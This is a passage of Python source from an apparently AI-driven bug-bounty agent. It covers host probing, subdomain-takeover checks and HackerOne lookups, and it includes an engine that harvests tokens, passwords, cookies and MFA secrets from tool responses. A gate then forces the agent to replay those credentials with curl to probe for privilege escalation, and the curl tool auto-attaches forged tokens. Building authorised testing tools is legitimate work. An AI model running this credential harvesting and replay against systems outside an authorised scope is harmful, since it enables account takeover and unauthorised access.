            if not host.startswith(("http://", "https://")):
                urls = [f"https://{host}", f"http://{host}"]
            else:
                urls = [host]
            for u in urls:
                try:
                    r = requests.get(u, timeout=5, verify=False, allow_redirects=True, headers=merge_global_context({}))
                    live_hosts.append({
                        "url": u,
                        "status_code": r.status_code,
                        "title": re.search(r'<title>(.*?)</title>', r.text, re.I).group(1).strip() if re.search(r'<title>(.*?)</title>', r.text, re.I) else "",
                        "tech": [r.headers.get("Server")] if r.headers.get("Server") else [],
                        "webserver": r.headers.get("Server", ""),
                        "content_length": len(r.content) if r.content is not None else 0,
                        "location": r.headers.get("Location", "")
                    })
                    break
                except Exception:
                    continue

    # Update target state and investigation memory
    try:
        live_urls = [h.get("url") for h in live_hosts if isinstance(h, dict) and h.get("url")]
        all_techs = []
        for h in live_hosts:
            if isinstance(h, dict):
                for t in h.get("tech", []):
                    if t and t not in all_techs:
                        all_techs.append(t)
        update_from_httpx(target, live_urls, all_techs)
        save_target(target)
    except Exception:
        if "live_hosts" not in target.state:
            target.state["live_hosts"] = []
        for h in live_hosts:
            if h not in target.state["live_hosts"]:
                target.state["live_hosts"].append(h)

    return {
        "count": len(live_hosts),
        "live_hosts": live_hosts
    }


def _execute_subzy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Subdomain takeover verification (DNS CNAME + Signature response check)."""
    subdomain = args.get("subdomain") or target.name
    subdomain = subdomain.strip().lower()
    if subdomain.startswith(("http://", "https://")):
        subdomain = urlparse(subdomain).netloc.split(":")[0]

    # Signatures of dangling CNAME services
    TAKEOVER_SIGNATURES = {
        "github": ("github.io", "There isn't a GitHub Pages site here."),
        "aws_s3": ("s3.amazonaws.com", "The specified bucket does not exist"),
        "heroku": ("herokudns.com", "No such app"),
        "shopify": ("myshopify.com", "Sorry, this shop is currently unavailable"),
        "fastly": ("fastly.net", "Fastly error: unknown domain"),
        "azure": ("azurewebsites.net", "404 Web Site not found"),
        "tumblr": ("tumblr.com", "Whatever you were looking for doesn't seem to exist"),
        "wordpress": ("wordpress.com", "Do you want to register"),
        "ghost": ("ghost.io", "The thing you were looking for is gone"),
    }

    cname_found = None
    vulnerable = False
    service_matched = None
    fingerprint = ""

    # Check DNS CNAME record
    try:
        cmd = ["dig", "+short", "CNAME", subdomain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0 and proc.stdout.strip():
            cname_found = proc.stdout.strip().rstrip('.')
    except Exception:
        pass

    if cname_found:
        for s_name, (s_cname_pattern, s_sig) in TAKEOVER_SIGNATURES.items():
            if s_cname_pattern in cname_found:
                service_matched = s_name
                # Check HTTP response body for signature
                try:
                    r = requests.get(f"http://{subdomain}", timeout=6, verify=False)
                    if s_sig in r.text:
                        vulnerable = True
                        fingerprint = s_sig
                except Exception:
                    pass
                break

    result = {
        "subdomain": subdomain,
        "cname": cname_found or "None",
        "service": service_matched or "Unknown",
        "takeover_candidate": vulnerable,
        "evidence": fingerprint if vulnerable else ("CNAME resolved to " + (cname_found or "none"))
    }

    if vulnerable:
        finding = {
            "type": "Subdomain Takeover Candidate",
            "target": subdomain,
            "cname": cname_found,
            "service": service_matched,
            "severity": "HIGH",
            "verified": True
        }
        if finding not in target.findings:
            target.findings.append(finding)
        try:
            update_from_subzy(target, [subdomain])
        except Exception:
            pass
        save_target(target)

    return result


def _execute_takeover_scanner(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan subdomains for takeover vulnerabilities using subjack and signature grep."""
    subdomains = args.get("subdomains")
    if not subdomains:
        subdomains = target.state.get("subdomains", [])
    
    if not subdomains:
        return {"error": "No subdomains found to scan."}

    # Write subdomains to a temp file in target's directory
    sub_file = Path(target.dir) / "takeover_subs_temp.txt"
    try:
        with open(sub_file, "w", encoding="utf-8") as f:
            for s in subdomains:
                f.write(f"{s}\n")
    except Exception as e:
        return {"error": f"Failed to write temporary subdomains file: {e}"}

    script_path = Path(__file__).resolve().parent.parent / "tools" / "takeover_scanner.sh"
    if not script_path.exists():
        return {"error": f"takeover_scanner.sh not found at {script_path}"}

    out_dir = Path(target.dir) / "takeover"
    out_dir.mkdir(parents=True, exist_ok=True)
    results_json = out_dir / "results.json"
    if results_json.exists():
        results_json.unlink()

    env = os.environ.copy()
    env["TAKEOVER_OUT_DIR"] = str(out_dir)

    try:
        cmd = [str(script_path), str(sub_file)]
        proc = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=180)
        
        # Parse JSON output
        results = []
        if results_json.exists():
            with open(results_json, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    results = json.loads(content)
    except Exception as e:
        results = []
        return {"error": f"takeover_scanner execution failed: {e}"}
    finally:
        if sub_file.exists():
            sub_file.unlink()

    # Process and verify candidates
    takeovers_found = []
    for entry in results:
        if isinstance(entry, dict) and entry.get("vulnerable"):
            takeovers_found.append(entry)
            finding = {
                "type": "Subdomain Takeover Candidate",
                "target": entry["subdomain"],
                "cname": entry.get("cname", "None"),
                "service": entry.get("service", "Unknown"),
                "severity": "HIGH",
                "verified": True
            }
            if finding not in target.findings:
                target.findings.append(finding)
    
    if takeovers_found:
        save_target(target)

    return {
        "scanned_count": len(subdomains),
        "takeovers_found": takeovers_found,
        "count": len(takeovers_found)
    }


def _execute_hackerone_search(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Search HackerOne Hacktivity for disclosed vulnerability reports."""
    keyword = args.get("keyword", "")
    program = args.get("program", "")
    limit = args.get("limit", 10)
    
    try:
        from hellhound.mcp.hackerone_mcp.server import search_disclosed_reports
        results = search_disclosed_reports(keyword=keyword, program=program, limit=limit)
        return {"status": "success", "results": results, "count": len(results)}
    except Exception as e:
        return {"error": f"HackerOne search failed: {e}"}


def _execute_hackerone_policy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get the public policy and scopes for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_policy
        result = get_program_policy(program)
        if "error" in result:
            return result
        return {"status": "success", "policy": result}
    except Exception as e:
        return {"error": f"Failed to retrieve HackerOne policy: {e}"}


def _execute_hackerone_stats(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get public statistics (bounties, response times, resolved reports) for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_stats
        result = get_program_stats(program)
        if "error" in result:
            return result
        return {"status": "success", "stats": result}
    except Exception as e:
        return {"error": f"Failed to retrieve HackerOne stats: {e}"}


def _clean_synthesizer_output(text: str) -> str:
    """
    Defensive net: if the synthesizer model ignored its plain-prose
    instruction and emitted a raw orchestrator-style JSON tool-call object
    instead (seen with small local models echoing prior tool-call turns),
    convert it into a readable sentence instead of dumping raw JSON to the
    user's terminal.
    """
    if not text:
        return text
    stripped = text.strip()
    candidate = stripped
    m = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', stripped)
    if m:
        candidate = m.group(1)
    elif not (stripped.startswith("{") and stripped.endswith("}")):
        return text

    try:
        parsed = json.loads(candidate)
    except Exception:
        return text

    if not isinstance(parsed, dict) or not ({"tool", "next_steps"} & set(parsed.keys())):
        return text

    parts = []
    if parsed.get("analysis"):
        parts.append(str(parsed["analysis"]))
    if parsed.get("next_steps"):
        parts.append(f"Next: {parsed['next_steps']}")
    if parsed.get("tool"):
        args_str = json.dumps(parsed.get("args", {}))
        parts.append(f"(Suggested next tool: {parsed['tool']} {args_str})")

    return "\n\n".join(parts) if parts else text


def _execute_dig(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    record_type = args.get("type", "A").upper()
    domain = domain.strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    records = []
    try:
        cmd = ["dig", "+short", record_type, domain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.strip():
                    records.append(line.strip())
    except Exception as e:
        records.append(f"Error running dig: {e}")

    return {
        "domain": domain,
        "type": record_type,
        "records": records
    }


# =========================================================================
# Structured Artifact Store & Extraction Engine (Token / Secret Inventory)
# =========================================================================

ARTIFACT_KEY_PATTERNS = [
    r"token", r"auth", r"key", r"secret", r"session", 
    r"cred", r"password", r"pass", r"api_key", r"jwt", r"bearer",
    r"sid", r"cookie", r"delegation", r"reset", r"mfa", r"otp",
    r"seed", r"code", r"hash", r"admin", r"hint", r"flag"
]

DISCOVERY_TOOLS: Set[str] = {
    "spider",
    "vhost_fuzz",
    "content_discovery",
    "fuzz_hunter",
    "subfinder",
    "dns_bruteforce",
    "permute_subdomains",
    "resolve_candidates",
    "port_scan",
    "tls_cert_scan",
}

ACTIONABLE_ARTIFACT_PATTERNS = [
    r"token", r"auth", r"jwt", r"bearer", r"api_key", r"access_token", r"refresh_token",
    r"password", r"pass", r"pwd", r"secret", r"credential",
    r"session", r"cookie", r"sid", r"phpsessid", r"connect\.sid",
    r"reset_token", r"reset_link", r"delegation_endpoint", r"mfa", r"otp", r"hash", r"flag"
]


def _flatten_json_dict(obj: Any, prefix: str = "") -> Dict[str, Any]:
    items: Dict[str, Any] = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            k_str = str(k)
            new_prefix = f"{prefix}.{k_str}" if prefix else k_str
            if isinstance(v, (dict, list)):
                items.update(_flatten_json_dict(v, new_prefix))
            else:
                items[new_prefix] = v
    elif isinstance(obj, list):
        for idx, item in enumerate(obj):
            new_prefix = f"{prefix}[{idx}]" if prefix else f"[{idx}]"
            if isinstance(item, (dict, list)):
                items.update(_flatten_json_dict(item, new_prefix))
            else:
                items[new_prefix] = item
    return items


def _infer_identity_from_context(obj_or_parent: Any, source_url: str) -> str:
    """Extract identity context (username, user_id, role) from structured object or source URL."""
    ident_parts = []
    if isinstance(obj_or_parent, dict):
        for field in ("username", "user", "identity", "name", "email", "login"):
            v = obj_or_parent.get(field)
            if v and isinstance(v, (str, int)) and str(v).strip() and len(str(v).strip()) < 50:
                ident_parts.append(str(v).strip())
                break
        for field in ("role", "title", "designation", "position"):
            v = obj_or_parent.get(field)
            if v and isinstance(v, (str, int)) and str(v).strip() and len(str(v).strip()) < 50:
                ident_parts.append(str(v).strip())
                break
        for field in ("id", "user_id", "uid", "account_id"):
            v = obj_or_parent.get(field)
            if v is not None and isinstance(v, (str, int)) and str(v).strip():
                ident_parts.append(f"user_id={v}")
                break

    if not ident_parts and source_url:
        m_id = re.search(r'/(?:users?|profiles?|accounts?|members?|staff)/([a-zA-Z0-9_.-]+)', source_url, re.I)
        if m_id:
            val = m_id.group(1)
            ident_parts.append(f"user_id={val}" if val.isdigit() else str(val))

    return " / ".join(ident_parts) if ident_parts else "unspecified identity"


def _is_actionable_artifact(art: Dict[str, Any]) -> bool:
    """Checks whether an artifact represents an actionable credential, token, session, or delegation handler."""
    if not isinstance(art, dict):
        return False
    field = str(art.get("field_name", "")).strip().lower()
    val = str(art.get("value", "")).strip()
    if not val or len(val) < 2:
        return False
    if val.lower() in ("true", "false", "null", "none", "undefined", "{}", "[]"):
        return False
    if field in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin"):
        return False
    return any(re.search(p, field, re.I) for p in ACTIONABLE_ARTIFACT_PATTERNS)


def extract_and_store_artifacts(tool_name: str, tool_args: Dict[str, Any], tool_output: Any, target: Target, turn_number: int = 1) -> List[Dict[str, Any]]:
    """
    Scans every tool output for credentials, tokens, session cookies, keys, and hints,
    storing deduplicated artifacts into target.state["artifacts"] with associated identity.
    Exempt from context pruning.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return []

    if "artifacts" not in target.state or not isinstance(target.state["artifacts"], list):
        target.state["artifacts"] = []

    source_url = ""
    if isinstance(tool_args, dict):
        source_url = str(tool_args.get("url") or tool_args.get("request_ref") or "")
    if not source_url and tool_name:
        source_url = tool_name

    new_artifacts: List[Dict[str, Any]] = []

    # 1. Process structured dictionary output from tool
    if isinstance(tool_output, dict):
        # A. Directly process credentials exposed by spider/recon
        for cred in tool_output.get("credentials_exposed", []) + tool_output.get("credentials", []):
            if isinstance(cred, dict):
                c_ident = cred.get("identity") or cred.get("username") or cred.get("user") or "identity"
                c_url = cred.get("url") or cred.get("source_url") or source_url
                for k, v in cred.items():
                    if k in ("token", "auth_token", "password", "pass", "mfa_secret", "mfa", "key", "secret", "value"):
                        if v and isinstance(v, (str, int)) and str(v).strip():
                            new_artifacts.append({
                                "field_name": k,
                                "value": str(v).strip(),
                                "source": c_url,
                                "associated_identity": c_ident,
                                "turn": turn_number,
                                "consumed": False,
                                "consumed_at": None,
                                "consumed_by": None
                            })

        # B. Directly process secrets exposed
        for sec in tool_output.get("secrets_exposed", []) + tool_output.get("secrets", []):
            if isinstance(sec, dict):
                s_ident = sec.get("identity") or "secret"
                s_url = sec.get("url") or sec.get("source_url") or source_url
                s_val = sec.get("value") or sec.get("secret") or sec.get("token")
                if s_val and isinstance(s_val, (str, int)) and str(s_val).strip():
                    new_artifacts.append({
                        "field_name": sec.get("type", "secret"),
                        "value": str(s_val).strip(),
                        "source": s_url,
                        "associated_identity": s_ident,
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # C. Flatten entire dictionary to find key-pattern matches
        flattened = _flatten_json_dict(tool_output)
        identity_context = _infer_identity_from_context(tool_output, source_url)

        for key, value in flattened.items():
            if value is None or isinstance(value, (dict, list)):
                continue
            v_str = str(value).strip()
            if not v_str or v_str.lower() in ("true", "false", "none", "null", "undefined", "{}", "[]"):
                continue
            leaf_key = key.split(".")[-1].split("[")[0].lower()
            if any(re.search(p, leaf_key, re.I) for p in ARTIFACT_KEY_PATTERNS) or any(re.search(p, key, re.I) for p in ARTIFACT_KEY_PATTERNS):
                if leaf_key in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin"):
                    continue
                new_artifacts.append({
                    "field_name": leaf_key,
                    "value": v_str,
                    "source": f"{tool_name.upper()} {source_url}".strip(),
                    "associated_identity": identity_context,
                    "turn": turn_number,
                    "consumed": False,
                    "consumed_at": None,
                    "consumed_by": None
                })

        # D. Extract from raw HTTP headers or set-cookie in tool_output
        hdrs = tool_output.get("headers") or {}
        if isinstance(hdrs, dict):
            for hk, hv in hdrs.items():
                if "cookie" in hk.lower() or "authorization" in hk.lower() or "token" in hk.lower():
                    new_artifacts.append({
                        "field_name": hk,
                        "value": str(hv),
                        "source": f"{tool_name.upper()} {source_url}".strip(),
                        "associated_identity": "session context",
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # E. Extract from cookies dictionary in tool_output
        cks = tool_output.get("cookies") or {}
        if isinstance(cks, dict):
            for ck, cv in cks.items():
                if cv and isinstance(cv, (str, int)) and str(cv).strip():
                    new_artifacts.append({
                        "field_name": str(ck),
                        "value": str(cv).strip(),
                        "source": f"{tool_name.upper()} {source_url}".strip(),
                        "associated_identity": "session cookie",
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # F. Extract JSON objects or tokens embedded inside response text
        raw_text = tool_output.get("body_preview") or tool_output.get("body") or tool_output.get("text") or tool_output.get("response") or ""
        if isinstance(raw_text, str) and raw_text.strip():
            raw_clean = raw_text.strip()
            # F1. Try direct JSON parsing of the body
            if (raw_clean.startswith("{") and raw_clean.endswith("}")) or (raw_clean.startswith("[") and raw_clean.endswith("]")):
                try:
                    direct_json = json.loads(raw_clean)
                    if isinstance(direct_json, (dict, list)):
                        d_ident = _infer_identity_from_context(direct_json, source_url)
                        for dk, dv in _flatten_json_dict(direct_json).items():
                            d_leaf = dk.split(".")[-1].split("[")[0].lower()
                            if any(re.search(p, d_leaf, re.I) for p in ARTIFACT_KEY_PATTERNS) or any(re.search(p, dk, re.I) for p in ARTIFACT_KEY_PATTERNS):
                                if d_leaf in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin"):
                                    continue
                                dv_str = str(dv).strip()
                                if dv_str and dv_str.lower() not in ("true", "false", "none", "null", "undefined", "{}", "[]"):
                                    new_artifacts.append({
                                        "field_name": d_leaf,
                                        "value": dv_str,
                                        "source": f"{tool_name.upper()} {source_url}".strip(),
                                        "associated_identity": d_ident,
                                        "turn": turn_number,
                                        "consumed": False,
                                        "consumed_at": None,
                                        "consumed_by": None
                                    })
                except Exception:
                    pass

            # F2. Scan for embedded state objects (window.INIT_PROFILE = {...}, data-profile='{...}')
            for match in re.finditer(r'(?:window\.[a-zA-Z0-9_$]+\s*=\s*|data-profile\s*=\s*[\'"]|INIT_STATE\s*=\s*)({.*?});?', raw_text, re.DOTALL):
                try:
                    parsed_embedded = json.loads(match.group(1))
                    if isinstance(parsed_embedded, dict):
                        emb_ident = _infer_identity_from_context(parsed_embedded, source_url)
                        for ek, ev in _flatten_json_dict(parsed_embedded).items():
                            e_leaf = ek.split(".")[-1].split("[")[0].lower()
                            if any(re.search(p, e_leaf, re.I) for p in ARTIFACT_KEY_PATTERNS):
                                ev_str = str(ev).strip()
                                if ev_str and ev_str.lower() not in ("true", "false", "none", "null", "undefined"):
                                    new_artifacts.append({
                                        "field_name": e_leaf,
                                        "value": ev_str,
                                        "source": f"{tool_name.upper()} {source_url}".strip(),
                                        "associated_identity": emb_ident,
                                        "turn": turn_number,
                                        "consumed": False,
                                        "consumed_at": None,
                                        "consumed_by": None
                                    })
                except Exception:
                    pass

            # F3. Scan for hints or delegation parameters in text (e.g. "Use at /login/impersonate?token=...")
            for hint_m in re.finditer(r'(?:use\s+at\s+|endpoint:\s*|url:\s*)(/[a-zA-Z0-9_/?&=.-]+)', raw_text, re.I):
                new_artifacts.append({
                    "field_name": "delegation_endpoint",
                    "value": hint_m.group(1),
                    "source": f"{tool_name.upper()} {source_url}".strip(),
                    "associated_identity": "delegation hint",
                    "turn": turn_number,
                    "consumed": False,
                    "consumed_at": None,
                    "consumed_by": None
                })

    # Deduplicate and merge into target.state["artifacts"]
    existing_entries = target.state["artifacts"]
    existing_keys = {(a.get("field_name"), a.get("value")) for a in existing_entries if isinstance(a, dict)}

    for art in new_artifacts:
        sig = (art.get("field_name"), art.get("value"))
        if sig not in existing_keys and art.get("value"):
            existing_keys.add(sig)
            existing_entries.append(art)

    try:
        save_target(target)
    except Exception:
        pass
    return new_artifacts


def mark_consumed_artifacts(tool_name: str, tool_args: Dict[str, Any], target: Target) -> None:
    """
    Inspects tool arguments (headers, cookies, body, url, token) to detect when an
    artifact (token, credential, session cookie, delegation endpoint) was actively tested/submitted,
    marking it as consumed so it no longer blocks discovery tools.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return

    artifacts = target.state.get("artifacts", [])
    if not artifacts or not isinstance(artifacts, list):
        return

    # Extract all candidate strings from tool_args
    arg_strings: Set[str] = set()
    if isinstance(tool_args, dict):
        # 1. URL / query
        url = str(tool_args.get("url") or tool_args.get("request_ref") or "")
        if url:
            arg_strings.add(url.lower())
            arg_strings.add(url)
        # 2. Token parameter
        if tool_args.get("token"):
            arg_strings.add(str(tool_args.get("token")).strip())
        # 3. Headers
        hdrs = tool_args.get("headers")
        if isinstance(hdrs, dict):
            for k, v in hdrs.items():
                arg_strings.add(str(v).strip())
                arg_strings.add(f"{k}: {v}")
        elif isinstance(hdrs, str):
            arg_strings.add(hdrs.strip())
        # 4. Cookies
        cks = tool_args.get("cookies") or tool_args.get("cookie")
        if isinstance(cks, dict):
            for k, v in cks.items():
                arg_strings.add(str(v).strip())
                arg_strings.add(f"{k}={v}")
        elif isinstance(cks, str):
            arg_strings.add(cks.strip())
        # 5. Body / JSON / Data
        for key in ("json", "data", "body"):
            val = tool_args.get(key)
            if isinstance(val, dict):
                for sub_k, sub_v in _flatten_json_dict(val).items():
                    if sub_v is not None and not isinstance(sub_v, (dict, list)):
                        arg_strings.add(str(sub_v).strip())
            elif isinstance(val, str) and val:
                arg_strings.add(val.strip())

    # If curl auto-attached active credentials/tokens from target state, those are active
    if tool_name == "curl":
        if target.state.get("auth_token"):
            arg_strings.add(str(target.state.get("auth_token")).strip())
        if target.state.get("session_cookie"):
            arg_strings.add(str(target.state.get("session_cookie")).strip())

    modified = False
    for art in artifacts:
        if not isinstance(art, dict):
            continue
        if art.get("consumed"):
            continue

        val = str(art.get("value", "")).strip()
        field = str(art.get("field_name", "")).strip().lower()

        if not val or len(val) < 2:
            continue

        # Check if delegation endpoint matches URL path
        if field == "delegation_endpoint":
            if any(val.lower() in s.lower() for s in arg_strings if s):
                art["consumed"] = True
                art["consumed_at"] = datetime.now(timezone.utc).isoformat()
                art["consumed_by"] = tool_name
                modified = True
            continue

        # Check if artifact value appears in any argument string
        if any(val in s or val.lower() in s.lower() for s in arg_strings if s):
            art["consumed"] = True
            art["consumed_at"] = datetime.now(timezone.utc).isoformat()
            art["consumed_by"] = tool_name
            modified = True

    if modified:
        try:
            save_target(target)
        except Exception:
            pass


def find_unconsumed_artifacts(target: Target, history: Optional[List[Dict[str, str]]] = None) -> List[Dict[str, Any]]:
    """
    Returns high-value actionable artifacts stored in target state that have not yet
    been consumed or tested in active requests.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return []

    artifacts = target.state.get("artifacts", [])
    if not artifacts or not isinstance(artifacts, list):
        return []

    unconsumed = []
    for art in artifacts:
        if not _is_actionable_artifact(art):
            continue
        if art.get("consumed"):
            continue

        val = str(art.get("value", "")).strip()
        # Retroactive history check: If the artifact value was passed in a tool command in history
        if history and len(val) >= 3:
            used_in_history = False
            for h in history:
                content = str(h.get("content", ""))
                if f"'{val}'" in content or f'"{val}"' in content or f"={val}" in content or f"Bearer {val}" in content:
                    art["consumed"] = True
                    art["consumed_by"] = "prior_turn"
                    used_in_history = True
                    break
            if used_in_history:
                continue

        unconsumed.append(art)

    return unconsumed


def check_artifact_preflight_gate(tool_name: str, args: Dict[str, Any], target: Target, history: Optional[List[Dict[str, str]]] = None) -> Optional[Dict[str, Any]]:
    """
    Hard mechanical pre-flight gate: Blocks broad discovery/recon tools (spider, vhost_fuzz,
    content_discovery, etc.) if high-value actionable security artifacts (tokens, credentials,
    cookies, delegation endpoints) have already been discovered but not yet tested.
    """
    if tool_name not in DISCOVERY_TOOLS:
        return None

    if isinstance(args, dict):
        if args.get("force") or args.get("ignore_artifacts") or args.get("skip_artifact_gate"):
            return None

    unconsumed = find_unconsumed_artifacts(target, history=history)
    if not unconsumed:
        return None

    primary = unconsumed[0]
    field = primary.get("field_name", "credential")
    val = primary.get("value", "")
    ident = primary.get("associated_identity", "target account")
    src = primary.get("source", "previous tool response")
    val_disp = val if len(val) <= 24 else f"{val[:20]}..."

    all_unconsumed_summary = ", ".join([
        f"{a.get('field_name')} for '{a.get('associated_identity', 'identity')}' ({a.get('value', '')[:16]}...)"
        for a in unconsumed[:3]
    ])

    return {
        "error": (
            f"ARTIFACT_PRE_FLIGHT_GATE: Discovered unconsumed security artifact '{field}' "
            f"associated with '{ident}' (value: '{val_disp}') from {src}. "
            f"You MUST test/verify this existing artifact (e.g. using curl targeting application endpoints "
            f"with this token/credential in headers/cookies) before running broad discovery tool '{tool_name}'."
        ),
        "blocked": True,
        "gate": "ARTIFACT_PRE_FLIGHT_GATE",
        "unconsumed_artifact": {
            "field_name": field,
            "value": val,
            "associated_identity": ident,
            "source": src
        },
        "all_unconsumed_count": len(unconsumed),
        "unconsumed_artifacts_preview": all_unconsumed_summary,
        "suggested_action": f"Execute curl with {field}='{val_disp}' (in Authorization header or Cookie) to test access or privilege escalation on target endpoints."
    }


def format_artifact_inventory(target: Target) -> str:
    """Builds a formatted, high-visibility Harvested Artifact Inventory ledger for prompt injection."""
    artifacts = target.state.get("artifacts", []) if hasattr(target, "state") and isinstance(target.state, dict) else []
    
    legacy_creds = target.state.get("credentials", []) if hasattr(target, "state") and isinstance(target.state, dict) else []
    active_cookies = target.state.get("cookies") or target.state.get("session_cookie") if hasattr(target, "state") and isinstance(target.state, dict) else None
    active_auth = target.state.get("auth_token") if hasattr(target, "state") and isinstance(target.state, dict) else None

    if not artifacts and not legacy_creds and not active_cookies and not active_auth:
        return ""

    lines = []
    seen_sigs = set()

    for art in artifacts:
        if isinstance(art, dict):
            ident = art.get("associated_identity") or "identity"
            field = art.get("field_name", "artifact")
            val = art.get("value", "")
            src = art.get("source", "")
            turn = art.get("turn")
            consumed = art.get("consumed", False)
            sig = (ident, field, val)
            if sig not in seen_sigs and val:
                seen_sigs.add(sig)
                src_part = f" [source: {src}" + (f", turn {turn}]" if turn is not None else "]") if src else ""
                status_tag = " [TESTED]" if consumed else " [UNTESTED - TEST THIS FIRST]"
                lines.append(f"- {ident}: {field}='{val}'{src_part}{status_tag}")

    for cred in legacy_creds:
        if isinstance(cred, dict):
            ident = cred.get("identity") or cred.get("username") or "user"
            src = cred.get("url") or cred.get("source_url") or ""
            tok = cred.get("token") or cred.get("auth_token") or cred.get("value")
            pwd = cred.get("password") or cred.get("pass")
            mfa = cred.get("mfa_secret") or cred.get("mfa")
            details = []
            if tok and (ident, "token", str(tok)) not in seen_sigs:
                details.append(f"token='{tok}'")
                seen_sigs.add((ident, "token", str(tok)))
            if pwd and (ident, "password", str(pwd)) not in seen_sigs:
                details.append(f"password='{pwd}'")
                seen_sigs.add((ident, "password", str(pwd)))
            if mfa and (ident, "mfa", str(mfa)) not in seen_sigs:
                details.append(f"mfa='{mfa}'")
                seen_sigs.add((ident, "mfa", str(mfa)))
            if details:
                lines.append(f"- {ident}: {', '.join(details)}" + (f" [source: {src}]" if src else ""))

    if active_cookies and ("session", "cookies", str(active_cookies)) not in seen_sigs:
        lines.append(f"- Active Session: cookies='{active_cookies}'")
    if active_auth and ("session", "auth_token", str(active_auth)) not in seen_sigs:
        lines.append(f"- Active Bearer: auth_token='{active_auth}'")

    if not lines:
        return ""

    return "================== HARVESTED ARTIFACT INVENTORY ==================\n" + "\n".join(lines) + "\n=================================================================="


def _singular_plural_variants(word: str) -> List[str]:
    """Cheap singular/plural variants of a URL path segment, used to catch
    the 'guessed /letters/<id>, real endpoint is /letter/<id>' class of
    mistake generically — not specific to any one target's naming."""
    variants = set()
    if word.endswith("ies") and len(word) > 3:
        variants.add(word[:-3] + "y")
    if word.endswith("s") and not word.endswith("ss") and len(word) > 1:
        variants.add(word[:-1])
    if not word.endswith("s"):
        variants.add(word + "s")
        if len(word) > 1 and word[-1] == "y" and word[-2].lower() not in "aeiou":
            variants.add(word[:-1] + "ies")
    variants.discard(word)
    return list(variants)


def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    url = args.get("url") or target.name
    method = args.get("method", "GET").upper()
    custom_headers = normalize_headers(args.get("headers"))
    
    body = args.get("json") or args.get("body") or args.get("data")
    
    base = target.name if (target and target.name) else ""
    if not base.startswith(("http://", "https://")):
        base = f"https://{base}" if base else "https://localhost"
    parsed_base = urlparse(base)
    base_path = parsed_base.path.rstrip("/")

    if not url.startswith(("http://", "https://")):
        if url.startswith("/"):
            if base_path and not url.startswith(base_path + "/") and url != base_path:
                url = f"{base_path}{url}"
            url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
        else:
            url = urljoin(base if base.endswith("/") else base + "/", url)
    else:
        # Auto-correct full URLs missing the target subpath scope
        parsed_url = urlparse(url)
        if parsed_base.netloc and parsed_url.netloc == parsed_base.netloc:
            if base_path and not parsed_url.path.startswith(base_path + "/") and parsed_url.path != base_path:
                new_path = f"{base_path}{parsed_url.path}"
                url = urlunparse((parsed_url.scheme, parsed_url.netloc, new_path, parsed_url.params, parsed_url.query, parsed_url.fragment))

    req_cookies = normalize_cookies(args.get("cookies") or args.get("cookie"))

    # If no Cookie header or cookies provided, auto-attach session cookies from target state if available
    if not req_cookies and not any(k.lower() == "cookie" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
        if saved_cookies:
            req_cookies = saved_cookies

    # If auth header not provided, auto-attach from target state
    if not any(k.lower() == "authorization" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
        if saved_token:
            custom_headers["Authorization"] = f"Bearer {saved_token}"

    headers = merge_global_context({"global_headers": custom_headers})
    
    json_payload = None
    data_payload = None
    
    if args.get("json") is not None:
        json_payload = args.get("json")
    elif isinstance(body, dict):
        json_payload = body
    elif isinstance(body, str):
        body_str = body.strip()
        if (body_str.startswith("{") and body_str.endswith("}")) or (body_str.startswith("[") and body_str.endswith("]")):
            try:
                import json
                json_payload = json.loads(body_str)
            except Exception:
                data_payload = body
        else:
            data_payload = body

    has_content_type = any(k.lower() == "content-type" for k in headers.keys())
    if json_payload is not None and not has_content_type:
        headers["Content-Type"] = "application/json"
    elif data_payload is not None and not has_content_type:
        if "=" in str(data_payload) and "&" in str(data_payload) or ("=" in str(data_payload) and not "{" in str(data_payload)):
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        if json_payload is not None:
            r = requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                json=json_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
        else:
            r = requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                data=data_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            )

        # Store observed session cookies in target.state so subsequent tools (curl, gowitness, spider) can reuse them
        raw_set_cookie = r.headers.get("set-cookie") or r.headers.get("Set-Cookie")
        if (r.cookies or raw_set_cookie) and hasattr(target, "state") and isinstance(target.state, dict):
